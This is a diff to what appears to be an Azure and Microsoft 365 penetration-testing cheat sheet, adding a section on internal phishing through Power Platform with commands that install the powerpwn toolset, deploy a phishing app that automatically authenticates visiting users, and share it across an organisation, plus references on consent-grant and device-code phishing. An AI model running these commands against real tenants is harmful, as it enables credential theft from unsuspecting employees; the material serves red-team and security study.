@@ -123,8 +123,23 @@ roadtx codeauth -c <app-id> -r msgraph -t <tenant-id> <0.A....> -ru 'https://<ph
     ```
 
 
+### Internal Phishing - Power Platform
+
+> Set up an internal phishing application on a Microsoft-owned domains which will automatically authenticate as users browse to your link.
+
+
+* Install [mbrg/power-pwn](https://github.com/mbrg/power-pwn) - An offensive and defensive security toolset for Microsoft 365 Power Platform
+    ```ps1
+    pip install powerpwn
+    ```
+* Install the application: `powerpwn phishing install-app -t {tenant-id} -e {environment-id} --input {path to application package zip} -n {application name}`
+* Share application with org: `powerpwn phishing share-app -t {tenant-id} -e {environment-id} -a {app id}`
+
+
 ## References
 
 * [Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
-* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
-* [The Art of the Device Code Phish - Bobby Cooke](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
+* [Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) - trouble1_raunak - Jun 6, 2021](https://www.youtube.com/watch?v=51FSvndgddk&list=WL)
+* [The Art of the Device Code Phish - Bobby Cooke - July 12, 2021](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
+* [Power Pwn - Black Hat Arsenal 2023 - Aug 24, 2023](https://www.youtube.com/watch?v=LpdckZyBwvs)
+* [Low Code High Risk - Enterprise Domination via Low Code Abuse - Defcon 30 - Oct 20, 2022](https://www.youtube.com/watch?v=D3A62Rzozq4)
